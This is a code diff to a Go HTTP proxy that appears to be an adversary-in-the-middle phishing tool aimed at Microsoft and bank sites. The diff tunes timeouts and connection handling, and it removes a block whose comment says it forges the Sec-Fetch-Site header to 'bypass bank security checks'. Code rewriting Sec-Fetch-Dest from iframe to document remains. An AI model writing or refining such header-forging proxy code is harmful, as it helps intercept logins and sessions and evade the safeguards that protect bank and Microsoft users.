@@ -217,7 +217,7 @@ const (
 	idleConnTimeout     = 30 * time.Second // Shorter timeout to recycle connections faster
 	tlsHandshakeTimeout = 30 * time.Second // TLS handshake deadline
 	expectContTimeout   = 1 * time.Second  // Expect: 100-continue timeout
-	respHeaderTimeout   = 60 * time.Second // Wait up to 60s for response headers
+	respHeaderTimeout   = 0                // DISABLED - Microsoft endpoints can be very slow
 
 	// Stealth/reliability: periodic maintenance
 	connPoolRefreshInterval = 1 * time.Minute // Refresh connections every minute
@@ -1652,13 +1652,6 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if sec_fetch_dest == "iframe" {
 						req.Header.Set("Sec-Fetch-Dest", "document")
 					}
-				}
-
-				// fix sec-fetch-site to appear as same-origin
-				// this helps bypass bank security checks
-				sec_fetch_site := req.Header.Get("Sec-Fetch-Site")
-				if sec_fetch_site == "cross-site" {
-					req.Header.Set("Sec-Fetch-Site", "same-origin")
 				}
 
 				// fix referer
@@ -4274,15 +4267,17 @@ func (p *HttpProxy) handleHTTPSConnection(c net.Conn) {
 	p.connStats.totalConns++
 	p.connStats.Unlock()
 
-	// Ensure connection is always closed when this function exits
+	// Recover from panics but do NOT close the connection here.
+	// goproxy manages connection lifecycle internally (keep-alive, etc.).
+	// Closing here would kill active HTTP keep-alive connections.
 	defer func() {
 		if r := recover(); r != nil {
 			log.Error("[httpsWorker] PANIC handling %s: %v", remoteAddr, r)
+			c.Close()
 			p.connStats.Lock()
 			p.connStats.failedConns++
 			p.connStats.Unlock()
 		}
-		c.Close()
 		p.connStats.Lock()
 		p.connStats.activeConns--
 		p.connStats.Unlock()
